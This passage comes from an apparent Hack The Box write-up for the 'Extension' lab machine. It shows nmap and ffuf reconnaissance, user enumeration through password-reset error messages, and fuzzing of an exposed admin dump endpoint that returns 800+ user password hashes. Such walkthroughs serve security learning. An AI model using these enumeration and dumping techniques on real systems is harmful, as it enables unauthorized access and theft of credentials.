<span id="cb1-7"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">22/tcp</span> open  ssh</span>
<span id="cb1-8"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">80/tcp</span> open  http</span>
<span id="cb1-9"></span>
<span id="cb1-10"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  extension nmap <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-Pn</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-n</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-p22,80</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-sCV</span> 10.10.11.171 </span>
<span id="cb1-11"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">PORT</span>   STATE SERVICE VERSION</span>
<span id="cb1-12"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">22/tcp</span> open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Ubuntu</span> Linux<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">protocol</span> 2.0<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb1-13"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ssh-hostkey:</span> </span>
<span id="cb1-14"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>   <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">2048</span> 82:21:e2:a5:82:4d:df:3f:99:db:3e:d9:b3:26:52:86 <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">RSA</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb1-15"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>   <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">256</span> 91:3a:b2:92:2b:63:7d:91:f1:58:2b:1b:54:f9:70:3c <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ECDSA</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb1-16"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">_</span>  256 65:20:39:2b:a7:3b:33:e5:ed:49:a9:ac:ea:01:bd:37 <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ED25519</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb1-17"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">80/tcp</span> open  http    nginx 1.14.0 <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Ubuntu</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb1-18"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">_http-title:</span> snippet.htb</span>
<span id="cb1-19"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">_http-server-header:</span> nginx/1.14.0 <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Ubuntu</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb1-20"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Service</span> Info: OS: Linux<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">CPE:</span> cpe:/o:linux:linux_kernel</span></code></pre></div>
<ul>
<li>Note the title - <strong>snippet.htb</strong>, add it to <code>/etc/hosts</code></li>
</ul>
<div class="sourceCode" id="cb2" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb2-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  extension ffuf <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-c</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-w</span> /usr/share/wordlists/dirb/big.txt <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-u</span> http://snippet.htb <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-H</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"Host: FUZZ.snippet.htb"</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-fw</span> 1022</span>
<span id="cb2-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">dev</span>                     [Status: 200, Size: 12822, Words: 1029, Lines: 250, Duration: 33ms]</span>
<span id="cb2-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">mail</span>                    [Status: 200, Size: 5311, Words: 364, Lines: 97, Duration: 750ms]</span></code></pre></div>
<ul>
<li>We find 2 vhosts using <code>fuff</code>, add them to <code>/etc/hosts</code></li>
</ul>
<div class="sourceCode" id="cb3" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb3-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  webanalyze ./webanalyze <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-host</span> http://snippet.htb</span>
<span id="cb3-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">http://snippet.htb</span> <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">0.4s</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">:</span></span>
<span id="cb3-3">    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Google</span> Font API,  <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Font</span> scripts<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb3-4">    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Ubuntu,</span>  <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Operating</span> systems<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb3-5">    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Nginx,</span> 1.14.0 <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Web</span> servers, Reverse proxies<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb3-6"></span>
<span id="cb3-7"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  webanalyze ./webanalyze <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-host</span> http://dev.snippet.htb</span>
<span id="cb3-8"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">http://dev.snippet.htb</span> <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">0.3s</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">:</span></span>
<span id="cb3-9">    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Nginx,</span> 1.14.0 <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Web</span> servers, Reverse proxies<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb3-10">    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Ubuntu,</span>  <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Operating</span> systems<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb3-11">    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Gitea,</span>  <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Development</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb3-12">    </span>
<span id="cb3-13"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  webanalyze ./webanalyze <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-host</span> http://mail.snippet.htb</span>
<span id="cb3-14"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">http://mail.snippet.htb</span> <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">0.2s</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">:</span></span>
<span id="cb3-15">    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Bootstrap,</span>  <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">UI</span> frameworks<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb3-16">    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">RoundCube,</span>  <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Webmail</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb3-17">    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">PHP,</span>  <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Programming</span> languages<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb3-18">    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Nginx,</span> 1.14.0 <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Web</span> servers, Reverse proxies<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb3-19">    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Ubuntu,</span>  <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Operating</span> systems<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb3-20">    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">PHP,</span> 7.4.27 <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Programming</span> languages<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span></code></pre></div>
<p>We have a lot to cover here, but lets start with the standard <code>snippet.htb</code>.</p>
<p>Looking on the webpage we find three potential users at the bottom of the frontpage - <em>Charlie Rooper</em>, <em>Jean Castux</em> and <em>Thierry Halliday</em>. It could be a good idea to add these to a file and use <a href="https://gist.github.com/christophetd/ff5237a439c20c629acc82afc9886f24"><code>namemash.py</code></a> to find potential usernames.</p>
<p>Pressing the big <em>“Get started”</em> button takes us to <code>/login</code> where <code>{}</code> is written above the login form for some reason. I remember when checking a HTB Tournament way back, the creators wrote <code>{}</code> in the http-title to hint that there should be SSTI on that particular page - maybe that’s the case here as well? Or I might just overanalyze and <code>{}</code> is logo for <em>snippet</em>.</p>
<p>The symbols appear on all browsable sites; <code>/login</code>, <code>/forgot-password</code> and <code>register</code>.</p>
<p><img src="https://exploit.se/posts/2022-09-11-htb-writeup-extension/images/extension01.png" class="img-fluid"></p>
<p>Looking on <code>/forgot-password</code> it seems like we can enumerate users, a invalid user will provide the error message <em>“no valid recipients”</em> while a valid user will return <em>“We have emailed you password reset link!”</em>.</p>
<p><img src="https://exploit.se/posts/2022-09-11-htb-writeup-extension/images/extension02.png" class="img-fluid"></p>
<p><img src="https://exploit.se/posts/2022-09-11-htb-writeup-extension/images/extension03.png" class="img-fluid"></p>
<p>We can confirm that both <code>charlie@snippet.htb</code> and <code>jean@snippet.htb</code> are valid users, however <code>thierry@snippet.htb</code> is <strong>not</strong>. Trying a bunch of different authentication bypass techniques with username <code>charlie@snippet.htb</code> locks the account for 60 seconds, so that’s not the way to go.</p>
<p>Trying to register a new account we’re met with the error <em>“Registration not allowed at this moment!”</em>, could it be that they disabled the feature as it’s vulnerable, or is it just a rabbit hole?</p>
<p>Playing around with the registration feature in Burp Suite I find nothing of use, lets leave it for now.</p>
<div class="sourceCode" id="cb4" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb4-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  extension ffuf <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-c</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-w</span> /usr/share/wordlists/dirb/big.txt <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-u</span> http://snippet.htb/FUZZ</span>
<span id="cb4-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">.htpasswd</span>               [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 51ms]</span>
<span id="cb4-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">.htaccess</span>               [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 57ms]</span>
<span id="cb4-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">cgi-bin/</span>                [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 30ms]</span>
<span id="cb4-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">css</span>                     [Status: 301, Size: 308, Words: 20, Lines: 10, Duration: 35ms]</span>
<span id="cb4-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">dashboard</span>               [Status: 302, Size: 342, Words: 60, Lines: 12, Duration: 1775ms]</span>
<span id="cb4-7"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">favicon.ico</span>             [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 29ms]</span>
<span id="cb4-8"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">forgot-password</span>         [Status: 200, Size: 37782, Words: 1022, Lines: 30, Duration: 1492ms]</span>
<span id="cb4-9"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">images</span>                  [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 670ms]</span>
<span id="cb4-10"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">js</span>                      [Status: 301, Size: 307, Words: 20, Lines: 10, Duration: 29ms]</span>
<span id="cb4-11"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">login</span>                   [Status: 200, Size: 37797, Words: 1022, Lines: 30, Duration: 1672ms]</span>
<span id="cb4-12"><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">logout</span>                  [Status: 405, Size: 825, Words: 132, Lines: 23, Duration: 2580ms]</span>
<span id="cb4-13"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">new</span>                     [Status: 302, Size: 342, Words: 60, Lines: 12, Duration: 1189ms]</span>
<span id="cb4-14"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">register</span>                [Status: 200, Size: 37745, Words: 1022, Lines: 30, Duration: 1096ms]</span>
<span id="cb4-15"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">reset-password</span>          [Status: 405, Size: 825, Words: 132, Lines: 23, Duration: 1891ms]</span>
<span id="cb4-16"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">server-status</span>           [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 30ms]</span>
<span id="cb4-17"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">snippets</span>                [Status: 302, Size: 342, Words: 60, Lines: 12, Duration: 1311ms]</span>
<span id="cb4-18"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">users</span>                   [Status: 302, Size: 342, Words: 60, Lines: 12, Duration: 1633ms]</span></code></pre></div>
<p>Trying to fuzz anything after <code>/snippets</code> all return 302’s, while testing both <code>/users</code> and <code>/dashboard</code> we get 404’s. However I find nothing more. Looking at the source code of <code>index.php</code> we find this huge script block which starts with all (?) functions on the site, including some we haven’t found yet.</p>
<div class="sourceCode" id="cb5" style="background: #f1f3f5;"><pre class="sourceCode javascript code-with-copy"><code class="sourceCode javascript"><span id="cb5-1"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">const</span> Ziggy <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> {</span>
<span id="cb5-2">    <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"url"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"http:</span><span class="sc" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">\/\/</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">snippet.htb"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span></span>
<span id="cb5-3">    <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"port"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">null</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span></span>
<span id="cb5-4">    <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"defaults"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span> {}<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span></span>
<span id="cb5-5">    <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"routes"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span> {</span>
<span id="cb5-6">    [<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">...</span> snip <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">...</span>]</span>
<span id="cb5-7">        <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"users"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span> {</span>
<span id="cb5-8">            <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"uri"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"users"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span></span>
<span id="cb5-9">            <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"methods"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span> [<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"GET"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"HEAD"</span>]</span>
<span id="cb5-10">        }<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span></span>
<span id="cb5-11">    [<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">...</span> snip <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">...</span>]</span>
<span id="cb5-12">        <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"snippets.update"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span> {</span>
<span id="cb5-13">            <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"uri"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"snippets</span><span class="sc" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">\/</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">update</span><span class="sc" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">\/</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">{id}"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span></span>
<span id="cb5-14">            <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"methods"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span> [<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"GET"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"HEAD"</span>]</span>
<span id="cb5-15">        }<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span></span>
<span id="cb5-16">        <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"api.snippets.update"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span> {</span>
<span id="cb5-17">            <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"uri"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"snippets</span><span class="sc" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">\/</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">update</span><span class="sc" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">\/</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">{id}"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span></span>
<span id="cb5-18">            <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"methods"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span> [<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"POST"</span>]</span>
<span id="cb5-19">        }<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span></span>
<span id="cb5-20">        <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"api.snippets.delete"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span> {</span>
<span id="cb5-21">            <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"uri"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"snippets</span><span class="sc" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">\/</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">delete</span><span class="sc" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">\/</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">{id}"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span></span>
<span id="cb5-22">            <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"methods"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span> [<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"DELETE"</span>]</span>
<span id="cb5-23">        }<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span></span>
<span id="cb5-24">        <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"snippets.new"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span> {</span>
<span id="cb5-25">            <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"uri"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"new"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span></span>
<span id="cb5-26">            <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"methods"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span> [<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"GET"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"HEAD"</span>]</span>
<span id="cb5-27">        }<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span></span>
<span id="cb5-28">        <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"users.validate"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span> {</span>
<span id="cb5-29">            <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"uri"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"management</span><span class="sc" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">\/</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">validate"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span></span>
<span id="cb5-30">            <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"methods"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span> [<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"POST"</span>]</span>
<span id="cb5-31">        }<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span></span>
<span id="cb5-32">        <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"admin.management.dump"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span> {</span>
<span id="cb5-33">            <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"uri"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"management</span><span class="sc" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">\/</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">dump"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span></span>
<span id="cb5-34">            <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"methods"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span> [<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"POST"</span>]</span></code></pre></div>
<p>Funtion <code>admin.management.dump</code> seems very interesting, we can only reach it through POST so we have to play around with cURL / fuff / Burp.</p>
<p>Here I was stuck for a while trying to fuzz the data object, I know that I need to include the <strong>Cookie-</strong>, <strong>X-XSRF-TOKEN</strong>- and <strong>Content-type</strong> headers, but when it comes to the data object I am clueless. After fuzzing the key and filtering with Burp I finally managed to find something:</p>
<p><strong>Request:</strong></p>
<p><img src="https://exploit.se/posts/2022-09-11-htb-writeup-extension/images/extension04.png" class="img-fluid"></p>
<p><strong>Response:</strong></p>
<p><img src="https://exploit.se/posts/2022-09-11-htb-writeup-extension/images/extension05.png" class="img-fluid"></p>
<p>The key <strong>download</strong> returns <em>“Unknown tablename”</em> while all other keys return <em>“Missing arguments”</em>, we’ve got something! Lets continue to fuzz the value field and we quickly find the variable <em>users</em>, from which we extract 800+ users with their password hash.</p>
<p><img src="https://exploit.se/posts/2022-09-11-htb-writeup-extension/images/extension06.png" class="img-fluid"></p>
</section>
<section id="step-2" class="level3">
<h3 class="anchored" data-anchor-id="step-2">Step 2</h3>
<p>Copy all json data to file and format it using <code>json.tool</code>:</p>
<div class="sourceCode" id="cb6" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb6-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  extension python3 <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-m</span> json.tool temp_download_users.json <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> snippet_users.json</span></code></pre></div>
<p>Looking for high value targets we find that <code>Charlie</code> is the only <em>manager</em> on the site:</p>
<div class="sourceCode" id="cb7" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb7-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  extension cat snippet_users.json <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">grep</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-B10</span> Manager</span>
<span id="cb7-2"><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">[</span></span>
<span id="cb7-3">    {</span>
